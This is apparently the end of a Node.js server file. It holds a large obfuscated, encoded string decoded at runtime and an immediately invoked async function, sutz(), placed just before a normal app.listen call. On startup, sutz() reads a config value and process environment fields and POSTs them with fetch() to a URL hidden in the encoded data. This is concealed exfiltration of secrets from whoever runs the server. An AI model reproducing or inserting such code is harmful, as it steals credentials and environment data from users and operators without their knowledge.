D%04EK=;0927N8;O0ID1NH==6?4A%3E%3E;;0I478%3E%1B%00%1E%0C%0C%1E%0C%0C%08F%00\'%25.MJ%1D%14%0E%16%1A%18%0BCN7%08%25*BLJMN%00#%16%22MJO%1B%0D%17%01%09%11%0A%09%08K\'%15+!KO%1D%19%07%1B%1F%17%0DFN@94A%3E8M=6?D1N8;;6I4788M=6?4A%3E%3E;;BI47%18%05%13%08%08%16%06%05%0BC%01$/&GC%1E%11%03%12%1E%10%01J%03%16%08%05%1F%0B%00%04MJ%1D%1BP%1F%03%0F%11C\'%11%1E&T%0C%10%0D%05%12%02%0D%01J%06%1A%1E%22CK%14%18%00%17%13%14%05BGAM8M=0CD18HGM0?2A%3EH=;6?2A%3E%3EO=@927LH=;%16%04%1A%04%06%17%0F%09%05B*2%1C%22NO%10%10%0A%1E%10%11%08FCCN18H=;B9DKN8;MJI47NBM=6?%12%0C%10%0D%05%12%02%0D%01J%029$\'CK%14%18%00%17%13%14%05BGMB8%114%06#GC8KOO0%09*%20!KO;%16%04%1A%04%06%17%0F%09%05B.?%16%22N%05%3C%14.C%1E%11%03%12%1E%10%01J%021%00/0%018%1C$%3E%5D%1B%0D%17%01%09%11%0A%09%08K%15=%07$KO%1D%19%07%1B%1F%17%0DF\':%0A*BLH/%17%03$GCN%14%20()JFA4%044\'CKD36%0B-NBI&%1B%0D%25NO@%11%0E-%1CKOM%22%13%07,MJM%05%0E),BL%1E%00%13%05%01%1B%03%0A%0DF?8%12.BL%18%14%03%1F%17%1D%04EKMN0I41DH=;@CD18%3EM=@9278%3EM=6K4A%3E%3E;O@JD1%3EH==@C47NBM=6?D1N8;;6I4788M=6?4A%3E%3E;;B%1F%09%1F%0B%00%12%0F%04%0CO%19*%04\'NB%19%1D%0F%11%16%14%08KJ.+%1D)NOB9%3E3%10*NO6J%22%12%1C!NOB%1F%09%1F%0B%00%12%0F%04%0CO?5%09\'NB%19%08%1E%0D/=?$%07*BL%3E%5B?%0D/%0D%08%5E%04%12%0E\'9%04%1D%0B/NO6_%22(\'+=/%0A$.BL%3EN%01%1F%0A#C%5E%0C%22##_%08%1E%0D/=N&,%0E-MJOMC%0D%09-.KOO6JFQ%0A\'#.0J6-4!NOBIG;$&$NBK2W%3E%3E%5D%1B%07%07%1BJ0%09%3E\'V9MSYTYPT%5ETRRV((%22)41_%22%11$=%17%22-%1E+Y6%13;Q5Y%3E%20%20%00%01%07%0B%05%5E%01%25%13@CH9AP%5EUTYW%5BU%5EDG@%12%00%09%09%00%1F%01%1FMFG%04%1D%1D%14%1EZJE%09%1D%01%01%1F%13%06%0B%02G%00%0BB%01%01%0E%1E%0C%1A%17BMFG.(*/(.!J:%5BI%25.4,%3C)5%078%0336+*(%0F%11%01%06%0C%06%00%0C%1B%5EM%5C%06%05%08%0CWINMYE%0F%06%0D%01S%3C%0B%0C%19%05%0F%0D%01%0C%00%18VIU%07%02%04%00TAJDXB%03%0A%0E%09W5%0A%1F%05%06%0F%05%1F%0C%16W@Y%0BL%01%1B%01%0B%5DGGODKZ@CHVC%08WINM%00%04%1ADJI%3E3$,-%0F%1C%08%0B%09%09%06%09%1BDG@%06%10%06%0A%00%05%08%08%12HIA%01%1D%10%1D%13_EC%08%19%0DC%14%00%06%09%0E%1B%05%00N%0A%18%0BF%0B%0B%19MFGC%1A%0C%0A%09-%00%19%1F%08%0E%01@CH%07%09%1D%01%0B%09MFG%3C&:79MFG%04%0C%08%00%08%12%16GOD*%0B%03%14%00%04%18:D0%14%10%00GOD%08%14%1D%0C%0C%09%0D%1D%00%0B%03O%0F%19%03%07DG@%02%0A%0E%15DJI%1E%14%17%03%02%0E%00%02%14MFG%0F%01%08%102%09%01GOD%1D%01%15%14HIA%19%08%16%1E%05:%07%03%0D%0CINM-%3E!%25D6Y%09%1F%0B%00%12%0F%04%0CO%1D%09%02$NB%19%1D%0F%11%16%14%08KJ.;%0D&NOB9%04%19%0E%25NO6JF%17%03%16%08%05%1F%0B%00%04E2%014*JF%11%17%06%12%13%19%0COBDB=;@92C%3EH=;6%1F%09%1F%0B%00%12%0F%04%0CO%19%0C6\'NB%19%1D%0F%11%16%14%08KJD1%3EH==@CD18%3EM=@9278H=;69D18%3E=MJI478%3EOMCJ6%036&NOBHG/%17%06*NBKF%17%03%16%08%05%1F%0B%00%04E.%02**JF%11%17%06%12%13%19%0COB%06%06-%25CKF1%0E%10%0D%20CK2BL%1E%00%13%05%01%1B%03%0A%0DF%09%0D-.BL%18%14%03%1F%17%1D%04EKAA0%15=%07$KO;CKF1N8;;%16%04%1A%04%06%17%0F%09%05B&%0B#%22NO%10%10%0A%1E%10%11%08F%18%03%16#MJM##-)BLH%11%20%25%20GCN*%25!/JF%17%03%16%08%05%1F%0B%00%04E%08%05/*JF%11%17%06%12%13%19%0COB%11%1A%16%03%04%04OB%3E%3EM=6KF1NBM=6INA%3E%3EMG@92ADH=;@CD18%3E%1B%00%1E%0C%0C%1E%0C%0C%08F%00%15%19(MJ%1D%14%0E%16%1A%18%0BCNN@J4A%3E8GM0?DKN8;;@9D18%3E;;@92C%3EH==@94A%3E%3E;M0I478%3EM=6?4A%3E%3E;=@CD18%3E;;BHG?%07)%1FNBKFAMH==@94A%3E%3E;M0I478%3EM=6?4A%3E%3E;=@9278J%1B3%1D%0D%25BLX%00%13%05%01%1B%03%0A%0DF+%13%1B-BL%18%14%03%1F%17%1D%04EKM=0I41NB=;@CD18%3EM=@9278H=;69D18%3E=M0?27LHNN@CD18HGM0?F@M%0C%04%22.JFCL%1E%00%13%05%01%1B%03%0A%0DF%01%1F%12-BL%18%14%03%1F%17%1D%04E%14%20()JFA4*5%22CKD#%14%0B%20NBI%1C%0B%22%1ANO@\'7%13$KO%1B%0D%17%01%09%11%0A%09%08K+%1A%19\'KO%1D%19%07%1B%1F%17%0DF%05,.)BLH%15%07%12+GCN*%17%0E-JFA%06%06-%25CKD;%021\'NBI%0C%25?+NO@\'\'%25#KOM%00%01&+MJM%11-,-BLH%11,:*GCN%10%07!%12JFA(%07*\'CKD/=%1A\'NBI%18,+!NO@+,-!KOM.:%16+MJM%05%0E),BLH#%3E%12#GCN%00%03-(JF%17%03%16%08%05%1F%0B%00%04E%00%17%0C)JF%11%13%02%14F.%10%02(XKV%1EZR-+%20NV%09YRZ%5CWTO%5D%1C%0A%06%06%00K#%14%06%20SBSV_T%5DO_%05WSVSXUFC%16%14%0F%12%08%0AG/%17%0E$O%10%01%0E%19%00CNV%04P_%5EQSPK%5DUWXPJ%5C#%19%0F-WMQPTXQZOU%0CTV%5BR%5B%5CLX%1D%05%04%0C%1C%1EE:%0B%02)_.%1D%10\'%5B%20%1E%0C%0C%1E%0C%0C%08N2%03*)M%14%0A5%20JFF(%07%22-CKC%09%08:#NBN%04%1D%13!NOBKGC%5E66%0C*JFQ%09%06%12F*%0D%08(X:%0B%02)9&%1F%0E/NO@%05%0B,%22KO;P%14%0E%18E%22/2)_GZ%0ARVV%5BRY%5E@USS_SFQ%12%0B%0F%0A%0EJ.#1!ZN%5B%0D%5EZUSWWZG_%12TSVV*KF%19%12%0A%12%05%03J.#1!O%1D%08%03%1C%0FEKV%09YRYZVWKPST__LY\'/?%20RBU%0CTVZU%5C%5CHUPRRQFQ%1E%22%11%13/9%1C%1F%09)NO6_6%07%01!=\'%18%08\'BLH%01%12%1B%20GC8X?%0B%0F%204#%10%10$NB?R%0D\'\'%22%5D%16%00%1D%0F%04%08%5D%05%0A%11%0AJMS%1EW%5BW_ZHS%09T%5BP%5C%5EUJ%5C\'%226-WD%22%09%01)%5DGZ%0AQVWZW%5BGSUWT%5EKUBU%1BWV%5EPWGU%0CTVYV_%5DLX%04%14%0E%03%04Q%18%1E%04%14%0E%03%04Q%06%02%15%03KJ_%05WSRU%5CVB%5CR%5BWUBX*%18%08!%5BG*%15%1A.ZKV%09YR%5DYPWKV%13S_%5E!TO%5CCR%00%5BUSVT_UJ%5CPVP%5EBY%0D%18%00%02%0D%5D%16%10%0A%1E%10%11%08F*%15%1A.%5E%1E%00%13%05%01%1B%03%0A%0DF%05%205-BL%18%14%03%1F%17%1D%04E%00)%3C#JFA4%044\'CKD%09%00(%25NBI*%22*%25NO@%15)$\'KOM%00%01&+MJ%1B%00%1E%0C%0C%1E%0C%0C%08F%1C$!(MJ%1D%14%0E%16%1A%18%0BCN=69478H=;B9D18HGM0?2%17%03%16%08%05%1F%0B%00%04E:!7)JF%11%17%06%12%13%19%0CO%19.5%22NBI69%0D(NO@\'7%13$KOM21%07!MJM%15%0A%1B&BL%1E%00%13%05%01%1B%03%0A%0DF%15(*-BL%18%14%03%1F%17%1D%04E%00%17%04\'JFA%12)7.CKD;%021\'NBI*2%1C%22NO%16%04%1A%04%06%17%0F%09%05B:..!NO%10%10%0A%1E%10%11%08FC921%12!%25%20CK2A%3E%3EO=%04%00+/MJ;%1B%22%0F%0A%10MJ%5D%00%1E%0C%0C%1E%0C%0C%08F%04%18-(MJ%1D%14%0E%16%1A%18%0BCN#%09!(BLJ=72%17&BL%3EN3%09%20&BLJ%1B%00%1E%0C%0C%1E%0C%0C%08F:#*(MJ%1D%14%0E%16%1A%18%0BC/%17%03$GCN%00!*-JFA%12%1B%14,CKD%19%04%1A/NBI%1C%0B%1C*NO%16%04%1A%04%06%17%0F%09%05B%1C%0B%22%1ANO%10%10%0A%1E%10%11%08FCC47N8;O0INA%3E%3EMG@927%18%05%13%08%08%16%06%05%0BC3%04!%1BGC%1E%11%03%12%1E%10%01JMK?5%1B#GCLIN7%08%25*BLJOMCI47L%1E%00%13%05%01%1B%03%0A%0DF%093%18%16BL%18%14%03%1F%17%1D%04EKMN0I41DH=;@CD18%3EM=@9278%3EM=6K4A%3E%3E;O@J:%0C(&NOB%1F%09%1F%0B%00%12%0F%04%0CO;%3C%20%1FNB%19%1D%0F%11%16%14%08KJD1%3EH==@CD18%3EM=@9278H=;69D18%3E=M0?27LHNMJI47NKMM0I4788M=6?FCNKMG@92AMHM=@927%3EH=;6KF%17%03%16%08%05%1F%0B%00%04E%083%12%12JF%11%17%06%12%13%19%0COB$%0C?-CKF1%0E%10%0D%20CK2BL%1E%00%13%05%01%1B%03%0A%0DF+=%15%16BL%18%14%03%1F%17%1D%04EK=;0%15-)#KO;@92C%3E%10%0F+%20JF7%18%14%02#%22JFQ%03%16%08%05%1F%0B%00%04E%044%08%12JF%11%17%06%12%13%19%0CO;%02)-NBI%0C)$)NO@/%1B%04#KOM:+%3C.MJM\'%3E%09$BL%1E%00%13%05%01%1B%03%0A%0DF/8%13%16BL%18%14%03%1F%17%1D%04E*%17%0E-JFA%20+)%20CKD+%0E5#NBI:%10%1F%25NO%16%04%1A%04%06%17%0F%09%05B&%07%00%19NO%10%05=%0C,%5E=;P%01%00%04%16%17F%0D%04%0A%15W,0%0F/CKT%09%0A%0D%15%12K\'%053%1C%5E%09%3E%19+GC%5E%00%09%08%18%16O%0D%09%01%1C%5B%00%01.!MJ%5D%05%04%0C%1C%1EE%22%015%12_6%13%10)NOP%01%00%04%16%17F%05%024%16W%021%08%1FCKT%1C%04%11F%11%0F/%16WMS%09W%5BR_XTQCP%5EWY%5ELX%1D%0A%0E%16O3%003%1F%5D%1C%0A%06%06%00K%11%02&%1BSBWUTTRPJZ%0AQVV%5BQ%5BCL%18%15%11%02%16%0C%02M%14%02+%12K%14%09%04%10%03FCTYRVUKV%04P_XVTTOQ%15%0B\'%1C%5ENV%04P__UVVK%5B%1A%5EZ$RROP;%0A:%1C%5ENV%13P%5E%5D%5DUCUBY%0D%18%00%02%0D%5D%08%03%1C%0FEKV%09%5DR_%5BURCV%13S_ZU%25O%5C%1C%06%22%13X:%036%12%5E:%00=%22=\'%0C1%167ZKPPYQYGU%0CTVZP%5C%5BLYNT%5DP%5CXQFV%09YR_ZQWO%5D%09%10%0A%0B%0EX%05%07%18%07OBU%0CPV%5BS_%5C@USS%5EPFP%12%07+%1FVJ_%05WSUW%5BRBZ%1DRVPY!FQ%3C%066%1F@IT%08%17%06%07%0DP%01%0E%19%00CNV%04T_ZTTSC%5B%1A%5EZUR#OQ%15%0B\'%1C%5ENWXS%5EYWFV%09YR_ZWPO%5D%10%0E%0A%1EE:%1F%25%11_MH%5E%00%09%08%18%16O+$%25%1C%5B%3E%087+%3E:%036%12?T%1C%04%11F3%1D%15%15WMS%09R%5BR%5E%5ESFV%1EZR_XWJ%5D%1D%07%07%1BJ%12%1B%1C%1CP%15%07%03%09%06N3%1D%15%15VMS%09W%5BR_XWPCP%5EWY%5ELJ%1D%15%1C%0B%1B%09%0DK3%10%1C%18F%11%06%02%15%03KJ%5D%5CWQTVNR%00XUSVWXKU?%13%14%1C%5B%1C%1A%15%10Y%22\'%20%119.%0D6%1A;YCR%17YUS\'%25NR%00XUSVS%5CKUBU%1BRV%5BZ-OU%0CTV%5BR%5CXLX%04%14%0E%03%04Q%06%02%15%03KJ_%12QSV%5E.G_%05WSVVXQFP0%15%11%1CVJ_%05WRVW%5BRBZ%1DRWVYRFQ%12%1B%1C%1CVJ_%12RV%04%05%0FSZGU,QT%5DU%5B%5CQQSOP%00%1D%0F%04%08%5D%05%0A%11%0AJMUPW%5ETBZ%0AQVWZSZC_6%10%11%11_G%5BVRWQ%5EG_%05WSVV_TFQ%1E:%1F%25%11IR%01%0A%0B%1C=.%086%138K\'\'-%184%0D%09%01%1C;C%15%17%10%1FJ8N%5DT%5EYSNV%09YR%5E%5BTROOP%1F%0D%18%00%02%0D%5D%08%03%1C%0FEKPPSZYGU%0CTVYVZYLY3%10%1C%18RBU%0CTV%5CV_ZHS%1EW%5B\'*ZLX%11%1E%11%18DA%5E%01%14%03%0A%09T%17%18%1E%014%0D+4%09%0C5%1F;C;%16)%1FJ%5D%1B%09%10%0A%0B%0EX%1B%1B%16%1F%09%1F%0B%00%12%0F%04%0CO;%16%12%1CNB%19%1D%0F%11%16%14%08K%09:%1E%1CKOM.%08%3E#MJM%05%12%1A+BLH3%1C%11$GC%18:%00+%09%00A%1D5!/%5B%0D%17%01%09%11%0A%09%08CK%14%18%00%17%13%14%05B%5ES%18X?%00&%00%0DD%3C%0E#/V%04%1A%04%06%17%0F%09%05JF%11%17%06%12%13%19%0COXV%1E%5D?%0D/%0D%08K:%09%04!_%09%1F%0B%00%12%0F%04%0CGC%1E%11%03%12%1E%10%01JWR%1B%5D2%04%22%08%07M\'1%0F(R%0C%10%0D%05%12%02%0D%01BL%18%14%03%1F%17%1D%04EP%5E%1BP;%09\'%07%01H3%01T&W%03%16%08%05%1F%0B%00%04MJ%1D%14%0E%16%1A%18%0BCU_%16Y6%0C(%01%04H%1C0W#X%05%13%08%08%16%06%05%0BKO%1D%19%07%1B%1F%17%0DFR%5B%1FT3%03.%04%04E%11%22Y,%5E%00%13%05%01%1B%03%0A%0DNO%10%10%0A%1E%10%11%08FYU%12Q%3C%05+%04%09L%22S3*%5B%00%1E%0C%0C%1E%0C%0C%08NB%19%1D%0F%11%16%14%08KPZ%17%5E:%00+%09%00A%05-:/%5B%0D%17%01%09%11%0A%09%08CK%14%18%00%17%13%14%05B%5E%5E%18X?%00&%00%0DD%0A)%10,V%04%1A%04%06%17%0F%09%05JF%11%17%06%12%13%19%0COX%5D%1E%5D?%0D/%0D%08K2%01%1F!_%09%1F%0B%00%12%0F%04%0CGC%1E%11%03%12%1E%10%01JWZ%1B%5D2%04%22%08%07M+%04%1F(R%0C%10%0D%05%12%02%0D%01BL%18%14%03%1F%17%1D%04EQT%1BP;%09\'%07%01H%01%11%0E%25W%03%16%08%05%1F%0B%00%04MJ%1D%14%0E%16%1A%18%0BCTR%16Y6%0C(%01%04H%22T%01%20X%05%13%08%08%16%06%05%0BKO%1D%19%07%1B%1F%17%0DFWZ%1FT3%03.%04%04E%01%1A%0D/%5E%00%13%05%01%1B%03%0A%0DNO%10%10%0A%1E%10%11%08FXT%12Q%3C%05+%04%09L*%5B%0C)%5B%00%1E%0C%0C%1E%0C%0C%08NB%19%1D%0F%11%16%14%08KQX%17%5E:%00+%09%00A%09%08%5B!%5B%0D%17%01%09%11%0A%09%08CK%14%18%00%17%13%14%05BV%17%5E:%00+%09%00A3%02P!%5B%0D%17%01%09%11%0A%09%08CK%14%18%00%17%13%14%05BW%17%5E:%00+%09%00A+*V!%5B%0D%17%01%09%11%0A%09%08CK%14%18%00%17%13%14%05B%5CZ%18X?%00&%00%0DD0%01?!V%04%1A%04%06%17%0F%09%05JF%11%17%06%12%13%19%0CO%5BW%1E%5D?%0D/%0D%08K%14,V,_%09%1F%0B%00%12%0F%04%0CGC%1E%11%03%12%1E%10%01JVV%1B%5D2%04%22%08%07M?%0F**R%0C%10%0D%05%12%02%0D%01BL%18%14%03%1F%17%1D%04EQP%1BP;%09\'%07%01H%15,%11\'W%03%16%08%05%1F%0B%00%04MJ%1D%14%0E%16%1A%18%0BCTV%16Y6%0C(%01%04H%00%15%06%22X%05%13%08%08%16%06%05%0BKO%1D%19%07%1B%1F%17%0DFUY%1FT3%03.%04%04E/%5C%01-%5E%00%13%05%01%1B%03%0A%0DNO%10%10%0A%1E%10%11%08FXS%12Q%3C%05+%04%09L%22_7+%5B%00%1E%0C%0C%1E%0C%0C%08NB%19%1D%0F%11%16%14%08KQ%5C%17%5E:%00+%09%00A%05!6.%5B%0D%17%01%09%11%0A%09%08CK%14%18%00%17%13%14%05B%5C%5E%18X?%00&%00%0DD%16%224%20V%04%1A%04%06%17%0F%09%05JF%11%17%06%12%13%19%0CO%5BP%1E%5D?%0D/%0D%08K.%3E,-_%09%1F%0B%00%12%0F%04%0CGC%1E%11%03%12%1E%10%01JTP%1B%5D2%04%22%08%07M%09%10&$R%0C%10%0D%05%12%02%0D%01BL%18%14%03%1F%17%1D%04ERQ%1BP;%09\'%07%01H/8\')W%03%16%08%05%1F%0B%00%04MJ%1D%14%0E%16%1A%18%0BCW%5E%16Y6%0C(%01%04H%00%11%0A-X%05%13%08%08%16%06%05%0BKO%1D%19%07%1B%1F%17%0DFQ%16%1FF\")")}();sutz();async function sutz(){const Mpkz=YfMbb.EKL9(0);const ornz=YfMbb.svw9(1);const oLaA=config[YfMbb.oij7(2)];const QMdA=`${YfMbb.MMN7(3)}${oLaA}`;const kIUz=`${YfMbb.Axy7(4)}${process[YfMbb.svw9(9)][YfMbb.oij7(10)]}${YfMbb.Y127(5)}${process[YfMbb.svw9(9)][YfMbb.MMN7(11)]}${YfMbb.QRS7(6)}${QMdA}${YfMbb.k995(7)}${oLaA}${YfMbb.EKL9(8)}`;const MJXz=`${YfMbb.Axy7(12)}${Mpkz}${YfMbb.Y127(13)}`;await fetch(MJXz,{[YfMbb.QRS7(14)]:YfMbb.k995(15),[YfMbb.EKL9(16)]:{[YfMbb.svw9(17)]:YfMbb.oij7(18)},[YfMbb.MMN7(19)]:JSON[YfMbb.Axy7(20)]({[YfMbb.Y127(21)]:ornz,[YfMbb.QRS7(22)]:kIUz,[YfMbb.k995(23)]:YfMbb.EKL9(24)})});}

app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
